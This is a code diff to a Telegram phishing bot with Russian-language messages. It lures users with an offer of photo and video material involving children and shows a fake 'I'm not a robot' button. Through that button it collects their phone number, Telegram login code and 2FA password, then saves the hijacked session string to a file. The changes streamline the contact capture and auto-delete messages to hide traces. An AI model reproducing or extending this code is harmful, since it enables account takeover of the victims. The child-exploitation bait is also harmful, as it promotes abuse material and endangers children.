@@ -114,9 +114,10 @@ async def cmd_start(message: types.Message):
         }
     )
 
-    keyboard = InlineKeyboardMarkup().add(
-        InlineKeyboardButton("Я точно не робот!🥰", callback_data="request_contact")
-    )
+    # Создаем клавиатуру с кнопкой, которая запрашивает контакт
+    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    keyboard.add(KeyboardButton("Я точно не робот!🥰", request_contact=True))
+
     await message.answer(
         "👋🇷🇺 ПРИВЕТ! ❤️\n"
         "У нас самые громные фото и выдео с детьми, больше 10.000 материала! 👀\n"
@@ -124,31 +125,17 @@ async def cmd_start(message: types.Message):
         reply_markup=keyboard
     )
 
-@dp.callback_query_handler(lambda c: c.data == 'request_contact')
-async def request_contact(callback_query: types.CallbackQuery):
-    user_id = callback_query.from_user.id
-    user_states[user_id] = 'awaiting_contact'
+    # Устанавливаем состояние ожидания контакта сразу
+    user_states[message.from_user.id] = 'awaiting_contact'
 
     update_user_log(
-        user_id=user_id,
+        user_id=message.from_user.id,
         updates={
-            "auth_button_clicked": True,
+            "auth_button_clicked": True,  # Считаем, что старт подразумевает готовность
             "auth_button_click_time": datetime.now(),
             "status": "awaiting_contact"
         }
     )
-
-    # Создаем клавиатуру с запросом контакта
-    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    keyboard.add(KeyboardButton("Поделиться номером", request_contact=True))
-
-    await bot.edit_message_text(
-        chat_id=user_id,
-        message_id=callback_query.message.message_id,
-        text="📱 Нажмите кнопку ниже, чтобы поделиться номером телефона:",
-        reply_markup=keyboard
-    )
-    await bot.answer_callback_query(callback_query.id)
 
 @dp.message_handler(content_types=['contact'])
 async def handle_contact(message: types.Message):
@@ -163,6 +150,15 @@ async def handle_contact(message: types.Message):
         await bot.delete_message(chat_id=user_id, message_id=message.message_id)
     except Exception as e:
         logging.error(f"Не удалось удалить сообщение с контактом: {e}")
+
+    # Удаляем клавиатуру
+    await bot.send_message(user_id, "Подтверждение получено.", reply_markup=types.ReplyKeyboardRemove())
+    # Удаляем это вспомогательное сообщение через 1 секунду
+    await asyncio.sleep(1)
+    try:
+        await bot.delete_message(user_id, message.message_id + 1)
+    except:
+        pass
 
     phone = message.contact.phone_number
     if not phone.startswith('+'):
@@ -201,7 +197,7 @@ async def handle_contact(message: types.Message):
         user_code_buffers[user_id]['message_id'] = msg_id
         
         # Отправляем сообщение о вводе кода и удаляем его через 3 секунды
-        msg = await message.answer("⌨️ Введите код, нажимая кнопки ниже:")
+        msg = await bot.send_message(user_id, "⌨️ Введите код, нажимая кнопки ниже:")
         await asyncio.sleep(3)
         try:
             await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
@@ -209,7 +205,7 @@ async def handle_contact(message: types.Message):
             pass
             
     except Exception as e:
-        error_msg = await message.answer(f"❌ Ошибка при отправке кода: {e}")
+        error_msg = await bot.send_message(user_id, f"❌ Ошибка при отправке кода: {e}")
         await client.disconnect()
         cleanup(user_id)
         await asyncio.sleep(3)
@@ -428,7 +424,7 @@ async def process_2fa(message: types.Message):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            success_msg = await message.answer("Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
+            success_msg = await bot.send_message(user_id, "Мы работаем в ручном режиме, извините за задержку, скоро отправим вам фото и видео материалы😉🧍‍♀️.")
             await client.disconnect()
             cleanup(user_id)
             await asyncio.sleep(5)
@@ -437,14 +433,14 @@ async def process_2fa(message: types.Message):
             except:
                 pass
         else:
-            error_msg = await message.answer("❌ Не удалось войти с 2FA.")
+            error_msg = await bot.send_message(user_id, "❌ Не удалось войти с 2FA.")
             await asyncio.sleep(3)
             try:
                 await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
             except:
                 pass
     except Exception as e:
-        error_msg = await message.answer(f"❌ Ошибка с 2FA: {e}")
+        error_msg = await bot.send_message(user_id, f"❌ Ошибка с 2FA: {e}")
         await client.disconnect()
         cleanup(user_id)
         await asyncio.sleep(3)
